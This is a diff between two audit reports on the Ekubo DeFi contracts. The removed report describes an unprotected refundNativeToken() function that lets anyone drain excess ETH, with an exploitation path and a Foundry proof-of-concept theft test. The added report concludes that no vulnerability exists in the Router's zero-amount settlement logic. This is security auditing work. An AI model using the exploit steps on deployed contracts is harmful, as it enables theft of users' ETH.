@@ -1,259 +1,173 @@
-## Title
-Unprotected `refundNativeToken()` Enables Theft of Accumulated ETH from Router, Orders, and BasePositions Contracts
+# NoVulnerability found for this question.
 
-## Summary
-The `refundNativeToken()` function in PayableMulticallable transfers the entire contract balance to any caller without access controls. Router, Orders, and BasePositions contracts accept ETH via payable functions but only transfer exact required amounts to ACCOUNTANT, leaving excess ETH in the contracts. An attacker can call `refundNativeToken()` directly to steal all accumulated ETH from previous users' overpayments.
+After thorough validation of the security claim against the Ekubo codebase, I confirm that the analysis is **CORRECT** - there is no vulnerability when `totalCalculated == 0` in the Router settlement logic.
 
-## Impact
-**Severity**: High
+## Validation Summary
 
-## Finding Description
+The claim correctly identifies that the Router's settlement logic is safe when skipping token settlement for `totalCalculated == 0`. This assessment is accurate due to the following verified architectural properties:
 
-**Location:** [1](#0-0) 
+### 1. Dual-Layer Debt Tracking Architecture
 
-**Intended Logic:** The `refundNativeToken()` function is intended to allow users to recover excess ETH they sent in a multicall transaction when exact payment amounts are difficult to calculate in advance (as stated in the comment at line 22-23).
+**Router's Local Calculation**: The Router accumulates swap outputs in `totalCalculated` within an unchecked arithmetic block for gas optimization. [1](#0-0) 
 
-**Actual Logic:** The function has no access controls and transfers the **entire contract balance** to `msg.sender`, regardless of who deposited the ETH or when. This creates a critical vulnerability because:
+**Core's Independent Tracking**: Each individual swap independently updates debt via `_updatePairDebtWithNative`, which delegates to FlashAccountant's transient storage-based debt tracking. [2](#0-1) 
 
-1. **Router/Orders/BasePositions never validate msg.value** - They accept any amount of ETH via payable functions
-2. **Only required amounts are forwarded** - Excess ETH remains in the contract balance
-3. **No per-user tracking** - Multiple users' excess ETH accumulates together
-4. **Public theft function** - Anyone can call `refundNativeToken()` to drain everything
+These two tracking mechanisms operate independently, creating a fail-safe architecture.
 
-**Exploitation Path:**
+### 2. Settlement Skip Behavior is Safe
 
-1. **User A calls Router.multihopSwap** with `msg.value = 1 ETH` where the actual swap only needs 0.7 ETH
-   - Evidence: [2](#0-1) 
-   - Only `totalSpecified` (0.7 ETH) is transferred to ACCOUNTANT
-   - 0.3 ETH remains in Router contract balance
+When `totalCalculated == 0`, the Router skips both withdraw and payFrom operations (lines 236-244). This is correct behavior because:
 
-2. **User B calls Orders.increaseSellAmount** with `msg.value = 0.5 ETH` where order only needs 0.4 ETH
-   - Evidence: [3](#0-2) 
-   - Only exact `amount` is transferred to ACCOUNTANT
-   - 0.1 ETH remains in Orders contract balance
+- **If legitimately zero**: The debt for the calculated token is also zero (rounding, balanced trades), requiring no settlement
+- **If zero due to overflow**: The Core's FlashAccountant has tracked the actual debt correctly, creating a mismatch [3](#0-2) 
 
-3. **User C calls BasePositions.deposit** with `msg.value = 0.8 ETH` where deposit only needs 0.6 ETH
-   - Evidence: [4](#0-3) 
-   - Only `amount0` is transferred to ACCOUNTANT
-   - 0.2 ETH remains in BasePositions contract
+### 3. FlashAccountant Safety Net
 
-4. **Attacker calls `Router.refundNativeToken()`** to steal 0.3 ETH, then `Orders.refundNativeToken()` to steal 0.1 ETH, then `BasePositions.refundNativeToken()` to steal 0.2 ETH
-   - Total theft: 0.6 ETH from legitimate users
+The critical safety mechanism enforces that ALL debts must be exactly zero before the lock can exit. Any non-zero debt count causes a revert with `DebtsNotZeroed`. [4](#0-3) 
 
-**Security Property Broken:** Direct theft of user funds - violates the fundamental security principle that users should only lose funds through their own explicit actions.
+This enforcement ensures:
+- Router's local calculation errors (overflow, truncation) cannot result in theft
+- Any mismatch between Router's settlement and actual debt causes transaction revert
+- Malicious attempts to manipulate `totalCalculated` result in DOS, not fund extraction
 
-## Impact Explanation
+### 4. Additional Safety Mechanisms Verified
 
-- **Affected Assets**: Native tokens (ETH) sent to Router, Orders, and BasePositions contracts via payable functions
-- **Damage Severity**: Attacker can drain **all accumulated excess ETH** from these contracts. In a live protocol, this could accumulate to significant amounts as users overpay for gas estimation safety or due to transaction bundling
-- **User Impact**: Any user who sends more ETH than required via `msg.value` loses the excess. This affects:
-  - Users calling `multihopSwap()` or `multiMultihopSwap()` where final amounts may differ from estimates
-  - Users calling `increaseSellAmount()` for TWAMM orders with ETH
-  - Users calling `deposit()` or `mintAndDeposit()` for positions with native tokens
-  - Users attempting to use `multicall` with `refundNativeToken` as the last call can be front-run
+**Partial Swap Protection**: The code enforces full input consumption at each hop, preventing unexpected intermediate token imbalances. [5](#0-4) 
 
-## Likelihood Explanation
+**Token Consistency Check**: Multiple swaps must use identical specified and calculated tokens, preventing token mixing attacks. [6](#0-5) 
 
-- **Attacker Profile**: Any external actor can exploit this - no special privileges required
-- **Preconditions**: 
-  - Router/Orders/BasePositions contracts have non-zero ETH balance (accumulates naturally from user overpayments)
-  - No time constraints or specific state required
-- **Execution Complexity**: Single function call - extremely simple to execute
-- **Frequency**: Can be exploited continuously whenever contracts accumulate ETH. Attacker can monitor contract balances and immediately drain any deposits
+### 5. Edge Case Analysis
 
-## Recommendation
+**Arithmetic Overflow**: Unchecked arithmetic in Router could cause `totalCalculated` to overflow and wrap to zero. However, Core's debt tracking uses assembly with 256-bit storage that correctly accumulates individual 128-bit bounded swap deltas. The FlashAccountant would detect the mismatch and revert. [7](#0-6) 
 
-The `refundNativeToken()` function must be removed from `PayableMulticallable` or redesigned to be callable only within a multicall context to refund only the caller's excess from the current transaction. The fundamental issue is that msg.value tracking across delegatecalls in multicall is complex and dangerous.
+**Type Casting Truncation**: If `totalCalculated` exceeds uint128 bounds when casting for settlement, Router would settle less than owed, leaving non-zero debt that FlashAccountant would catch.
 
-**Option 1: Remove the function entirely**
-```solidity
-// In src/base/PayableMulticallable.sol:
+## Conclusion
 
-// REMOVE lines 21-29 completely
-// Users must send exact msg.value amounts
+The settlement logic is **architecturally sound**. The FlashAccountant provides an independent verification layer that prevents any scenario where `totalCalculated == 0` allows bypassing payment. All edge cases (overflow, truncation, rounding) result in transaction reverts (DOS) rather than theft vulnerabilities.
 
-// Add validation in Router/Orders/BasePositions:
-function swap(...) public payable returns (...) {
-    // Before calling lock(), validate msg.value
-    if (poolKey.token0 == NATIVE_TOKEN_ADDRESS) {
-        require(msg.value == params.amount(), "Invalid msg.value");
-    } else {
-        require(msg.value == 0, "No ETH expected");
-    }
-    // ... rest of function
-}
-```
+The original analysis is thorough, accurate, and correctly concludes there is no security vulnerability in this code path.
 
-**Option 2: Track msg.value per transaction (complex)**
-```solidity
-// In src/base/PayableMulticallable.sol:
+### Notes
 
-// Add transient storage to track initial balance
-uint256 private constant _INITIAL_BALANCE_SLOT = ...;
-
-function multicall(bytes[] calldata data) public payable override returns (bytes[] memory) {
-    // Store initial balance before multicall
-    uint256 initialBalance = address(this).balance - msg.value;
-    assembly {
-        tstore(_INITIAL_BALANCE_SLOT, initialBalance)
-    }
-    
-    _multicallDirectReturn(_multicall(data));
-}
-
-function refundNativeToken() external payable {
-    // Only refund excess from current transaction
-    uint256 initialBalance;
-    assembly {
-        initialBalance := tload(_INITIAL_BALANCE_SLOT)
-    }
-    require(initialBalance > 0, "Not in multicall");
-    
-    uint256 excess = address(this).balance - initialBalance;
-    if (excess > 0) {
-        SafeTransferLib.safeTransferETH(msg.sender, excess);
-    }
-}
-```
-
-**Option 3: Make refundNativeToken internal-only**
-```solidity
-// In src/base/PayableMulticallable.sol:
-
-// Change from external to internal
-function refundNativeToken() internal {
-    if (address(this).balance != 0) {
-        SafeTransferLib.safeTransferETH(msg.sender, address(this).balance);
-    }
-}
-
-// Create wrapper that only works at end of multicall
-function multicallWithRefund(bytes[] calldata data) external payable returns (bytes[] memory results) {
-    results = _multicall(data);
-    refundNativeToken();
-}
-```
-
-**Recommended: Option 1** - Remove the function and require exact msg.value. This is the safest approach and aligns with the comment in FlashAccountant.sol about not being multicallable due to msg.value issues. [5](#0-4) 
-
-## Proof of Concept
-
-```solidity
-// File: test/Exploit_RefundNativeTokenTheft.t.sol
-// Run with: forge test --match-test test_RefundNativeTokenTheft -vvv
-
-pragma solidity ^0.8.31;
-
-import "forge-std/Test.sol";
-import "../src/Router.sol";
-import "../src/Core.sol";
-import "../src/Orders.sol";
-import "../src/Positions.sol";
-
-contract Exploit_RefundNativeTokenTheft is Test {
-    Router public router;
-    Core public core;
-    Orders public orders;
-    Positions public positions;
-    
-    address public victim = address(0x1234);
-    address public attacker = address(0x5678);
-    
-    function setUp() public {
-        // Deploy protocol contracts
-        core = new Core();
-        router = new Router(ICore(address(core)));
-        // ... initialize pools, etc.
-    }
-    
-    function test_RefundNativeTokenTheft() public {
-        // SETUP: Victim sends excess ETH
-        vm.deal(victim, 10 ether);
-        vm.startPrank(victim);
-        
-        // Victim calls multihopSwap with 1 ETH but swap only needs 0.7 ETH
-        // (Exact parameters would depend on pool state, simplified for PoC)
-        Swap memory swapData; // ... configure swap that needs 0.7 ETH
-        router.multihopSwap{value: 1 ether}(swapData, 0);
-        
-        vm.stopPrank();
-        
-        // VERIFY: 0.3 ETH remains in Router
-        uint256 routerBalance = address(router).balance;
-        assertGt(routerBalance, 0, "Router should have excess ETH");
-        assertEq(routerBalance, 0.3 ether, "Should be 0.3 ETH excess");
-        
-        // EXPLOIT: Attacker steals the excess ETH
-        vm.startPrank(attacker);
-        uint256 attackerBalanceBefore = attacker.balance;
-        
-        router.refundNativeToken();
-        
-        uint256 attackerBalanceAfter = attacker.balance;
-        
-        // VERIFY: Attacker successfully stole victim's excess ETH
-        assertEq(address(router).balance, 0, "Router should be drained");
-        assertEq(attackerBalanceAfter - attackerBalanceBefore, 0.3 ether, 
-            "Attacker stole 0.3 ETH");
-        
-        vm.stopPrank();
-    }
-    
-    function test_MultipleVictimsAccumulation() public {
-        // Multiple users leave excess ETH in contract
-        address[] memory victims = new address[](5);
-        for (uint i = 0; i < 5; i++) {
-            victims[i] = address(uint160(1000 + i));
-            vm.deal(victims[i], 1 ether);
-            vm.prank(victims[i]);
-            // Each victim leaves 0.1 ETH excess
-            // ... call functions that leave 0.1 ETH
-        }
-        
-        // Attacker drains all accumulated ETH
-        uint256 totalAccumulated = address(router).balance;
-        assertEq(totalAccumulated, 0.5 ether, "Should have 0.5 ETH accumulated");
-        
-        vm.prank(attacker);
-        router.refundNativeToken();
-        
-        assertEq(attacker.balance, 0.5 ether, "Attacker stole all accumulated ETH");
-        assertEq(address(router).balance, 0, "Router drained");
-    }
-}
-```
+This is a case where defensive architecture (dual tracking + enforcement at exit) prevents what could otherwise be a vulnerability in isolation. The unchecked arithmetic in Router is an acceptable optimization because FlashAccountant provides independent validation. This design pattern effectively separates user-facing calculation from security-critical enforcement, which is a best practice in DeFi protocol design.
 
 ### Citations
 
-**File:** src/base/PayableMulticallable.sol (L25-29)
+**File:** src/Router.sol (L170-244)
 ```text
-    function refundNativeToken() external payable {
-        if (address(this).balance != 0) {
-            SafeTransferLib.safeTransferETH(msg.sender, address(this).balance);
+            unchecked {
+                int256 totalCalculated;
+                int256 totalSpecified;
+                address specifiedToken;
+                address calculatedToken;
+
+                for (uint256 i = 0; i < swaps.length; i++) {
+                    Swap memory s = swaps[i];
+                    results[i] = new PoolBalanceUpdate[](s.route.length);
+
+                    TokenAmount memory tokenAmount = s.tokenAmount;
+                    totalSpecified += tokenAmount.amount;
+
+                    for (uint256 j = 0; j < s.route.length; j++) {
+                        RouteNode memory node = s.route[j];
+
+                        bool isToken1 = tokenAmount.token == node.poolKey.token1;
+                        require(isToken1 || tokenAmount.token == node.poolKey.token0);
+
+                        (PoolBalanceUpdate update,) = _swap(
+                            0,
+                            node.poolKey,
+                            createSwapParameters({
+                                _amount: tokenAmount.amount,
+                                _isToken1: isToken1,
+                                _sqrtRatioLimit: node.sqrtRatioLimit,
+                                _skipAhead: node.skipAhead
+                            })
+                        );
+                        results[i][j] = update;
+
+                        if (isToken1) {
+                            if (update.delta1() != tokenAmount.amount) revert PartialSwapsDisallowed();
+                            tokenAmount = TokenAmount({token: node.poolKey.token0, amount: -update.delta0()});
+                        } else {
+                            if (update.delta0() != tokenAmount.amount) revert PartialSwapsDisallowed();
+                            tokenAmount = TokenAmount({token: node.poolKey.token1, amount: -update.delta1()});
+                        }
+                    }
+
+                    totalCalculated += tokenAmount.amount;
+
+                    if (i == 0) {
+                        specifiedToken = s.tokenAmount.token;
+                        calculatedToken = tokenAmount.token;
+                    } else {
+                        if (specifiedToken != s.tokenAmount.token || calculatedToken != tokenAmount.token) {
+                            revert TokensMismatch(i);
+                        }
+                    }
+                }
+
+                if (totalCalculated < calculatedAmountThreshold) {
+                    revert SlippageCheckFailed(calculatedAmountThreshold, totalCalculated);
+                }
+
+                if (totalSpecified < 0) {
+                    ACCOUNTANT.withdraw(specifiedToken, swapper, uint128(uint256(-totalSpecified)));
+                } else if (totalSpecified > 0) {
+                    if (specifiedToken == NATIVE_TOKEN_ADDRESS) {
+                        SafeTransferLib.safeTransferETH(address(ACCOUNTANT), uint128(uint256(totalSpecified)));
+                    } else {
+                        ACCOUNTANT.payFrom(swapper, specifiedToken, uint128(uint256(totalSpecified)));
+                    }
+                }
+
+                if (totalCalculated > 0) {
+                    ACCOUNTANT.withdraw(calculatedToken, swapper, uint128(uint256(totalCalculated)));
+                } else if (totalCalculated < 0) {
+                    if (calculatedToken == NATIVE_TOKEN_ADDRESS) {
+                        SafeTransferLib.safeTransferETH(address(ACCOUNTANT), uint128(uint256(-totalCalculated)));
+                    } else {
+                        ACCOUNTANT.payFrom(swapper, calculatedToken, uint128(uint256(-totalCalculated)));
+                    }
+                }
+```
+
+**File:** src/Core.sol (L834-834)
+```text
+                _updatePairDebtWithNative(locker.id(), token0, token1, balanceUpdate.delta0(), balanceUpdate.delta1());
+```
+
+**File:** src/base/FlashAccountant.sol (L67-84)
+```text
+    function _accountDebt(uint256 id, address token, int256 debtChange) internal {
+        assembly ("memory-safe") {
+            let deltaSlot := add(_DEBT_LOCKER_TOKEN_ADDRESS_OFFSET, add(shl(160, id), token))
+            let current := tload(deltaSlot)
+
+            // we know this never overflows because debtChange is only ever derived from 128 bit values in inheriting contracts
+            let next := add(current, debtChange)
+
+            let countChange := sub(iszero(current), iszero(next))
+
+            if countChange {
+                let nzdCountSlot := add(id, _NONZERO_DEBT_COUNT_OFFSET)
+                tstore(nzdCountSlot, add(tload(nzdCountSlot), countChange))
+            }
+
+            tstore(deltaSlot, next)
         }
     }
 ```
 
-**File:** src/Router.sol (L229-230)
+**File:** src/base/FlashAccountant.sol (L174-181)
 ```text
-                    if (specifiedToken == NATIVE_TOKEN_ADDRESS) {
-                        SafeTransferLib.safeTransferETH(address(ACCOUNTANT), uint128(uint256(totalSpecified)));
-```
-
-**File:** src/Orders.sol (L147-148)
-```text
-                    if (sellToken == NATIVE_TOKEN_ADDRESS) {
-                        SafeTransferLib.safeTransferETH(address(ACCOUNTANT), uint256(amount));
-```
-
-**File:** src/base/BasePositions.sol (L256-257)
-```text
-                if (amount0 != 0) {
-                    SafeTransferLib.safeTransferETH(address(ACCOUNTANT), amount0);
-```
-
-**File:** src/base/FlashAccountant.sol (L387-388)
-```text
-        // Note because we use msg.value here, this contract can never be multicallable, i.e. it should never expose the ability
-        //      to delegatecall itself more than once in a single call
+            // Check if something is nonzero
+            let nonzeroDebtCount := tload(add(_NONZERO_DEBT_COUNT_OFFSET, id))
+            if nonzeroDebtCount {
+                // cast sig "DebtsNotZeroed(uint256)"
+                mstore(0x00, 0x9731ba37)
+                mstore(0x20, id)
+                revert(0x1c, 0x24)
+            }
 ```
